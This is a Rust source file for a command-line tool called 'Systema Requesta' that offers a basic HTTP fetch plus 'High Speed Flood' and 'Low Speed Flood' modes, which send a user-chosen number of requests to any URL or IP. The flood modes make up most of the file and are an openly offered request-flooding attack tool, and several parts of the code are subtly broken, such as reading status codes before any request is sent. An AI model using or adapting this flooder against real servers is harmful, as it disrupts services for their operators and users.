// Code name: Systema Requesta
// Code Maintainer/Developer: rahmed
// Github: github.com/rahmedi/systemarequesta
// Written With Rust

use std::{io::{stdin, stdout, Write}, time::Duration};
use curl::easy::Easy;

fn pull(){
    println!("Welcome To Pull System v0.1");
    let mut pull_client = Easy::new();
    let mut url_input = String::new();

    print!("URL or IP >");
    stdout().flush().unwrap();
    stdin().read_line(&mut url_input).expect("Failed to Read Input: Url or IP");
    let url_now = url_input.trim();
    pull_client.url(url_now).unwrap();
    pull_client.perform().unwrap();

    let status = pull_client.response_code().unwrap();
    let write_function = pull_client.write_function(|data| {
        Ok(stdout().write(data).unwrap())
    }).unwrap();
        println!("Status Code:{:?}", status);
    if status == 200{
        println!("Request Is Succesfull");
    }else if (301..=302).contains(&status) {
           println!("You are redirected to: {:?}", pull_client.redirect_url().unwrap().unwrap());
    }else if status == 400 {
        println!("Bad Request")
    }else if status == 401 {
        println!("You need Authenticate")
    }else if status == 403 {
        println!("Server Banned You")
    }else if status == 404 {
        println!("Not Found")
    }

}
// This is High speed flood 
fn hsf() {

    println!("Welcome to High Speed Flood v0.1");
    let mut hsf_client = Easy::new();
    let mut hsf_target = String::new();
    let mut hsf_numstr = String::new();

    print!("Url or IP > ");
    stdout().flush().unwrap();
    stdin().read_line(&mut hsf_target).expect("Failed to Read Input: Url or IP");
    
    let hsf_target = hsf_target.trim(); // Kullanıcıdan alınan URL'yi temizle
    if hsf_target.is_empty() {
        println!("Error: URL cannot be empty");
        return; // URL boşsa fonksiyondan çık
    }

    print!("Request Number > ");
    stdout().flush().unwrap();
    stdin().read_line(&mut hsf_numstr).expect("Failed to Read Input: Request Number");
    
    let hsf_number: i64 = hsf_numstr.trim().parse().expect("Invalid number");

    for h in 1..=hsf_number {
        let hsf_status: u32 = hsf_client.response_code().unwrap();
        if (400..=499).contains(&hsf_status){
            println!("Failed to Send Request: Server is Blocking You");
            return;
        }else if (300..=399).contains(&hsf_status){
            let hsf_redirect = hsf_client.redirect_url().unwrap().unwrap().to_string();
            println!("Redirect Detected to {:?}", hsf_redirect);
            hsf_client.perform().unwrap();
        }
        hsf_client.url(hsf_target).unwrap(); 
        hsf_client.perform().unwrap();
        println!("{:?} Request is sent", h+1)
    }
    println!("Completed {:?} requests to {:?}", hsf_number, hsf_target);
}
// This is Low speed flood 
fn lsf(){
    println!("Welcome to Low Speed Flood v0.1");
    let mut lsf_client = Easy::new();
    let mut lsf_target = String::new();
    let mut lsf_numstr = String::new();

    print!("Url or IP > ");
    stdout().flush().unwrap();
    stdin().read_line(&mut lsf_target).expect("Failed to Read Input: Url or IP");
    
    let lsf_target = lsf_target.trim(); 
    if lsf_target.is_empty() {
        println!("Error: URL cannot be empty");
        return; 
    }

    print!("Request Number > ");
    stdout().flush().unwrap();
    stdin().read_line(&mut lsf_numstr).expect("Failed to Read Input: Request Number");
    
    let lsf_number: i64 = lsf_numstr.trim().parse().expect("Invalid number");
    

    for l in 1..=lsf_number{
        let lsf_status: u32 = lsf_client.response_code().unwrap();

        if (400..=499).contains(&lsf_status){
            println!("Failed to Send Request: Server is Blocking You");
            return;
        }else if (300..=399).contains(&lsf_status){
            let lsf_redirect = lsf_client.redirect_url().unwrap().unwrap().to_string();
            println!("Redirect Detected to {:?}", lsf_redirect);
            lsf_client.url(&lsf_redirect);
            lsf_client.perform().unwrap();
        }
        std::thread::sleep(Duration::from_secs(1));
        lsf_client.url(lsf_target).unwrap(); 
        lsf_client.perform().unwrap();
        println!("{:?} Request is sent. Status is {:?}", l+1, lsf_status);
    }
    println!("Completed {:?} requests to {:?}", lsf_number, lsf_target);
}
// this is main func

fn main() {
    println!("Welcome To Systema Requesta");
    let mut selection = String::new();
    println!("Select a Mode:");
    println!("Available Modes:\n1 = Pull\n2 = HSF\n3 = LSF");
    print!("Select >");
    stdout().flush().unwrap();
    stdin().read_line(&mut selection).expect("Failed to Read Input");
    let selection = selection.trim();
    if selection == "1" || selection.eq_ignore_ascii_case("pull") {
        pull();
    }else if selection == "2" || selection.eq_ignore_ascii_case("hsf") {
    hsf();
    }else if selection == "3" || selection.eq_ignore_ascii_case("lsf"){
    lsf();
    }else {
    println!("Invalid input, please select 1 (Pull) or 2 (HSF)");
    }
}
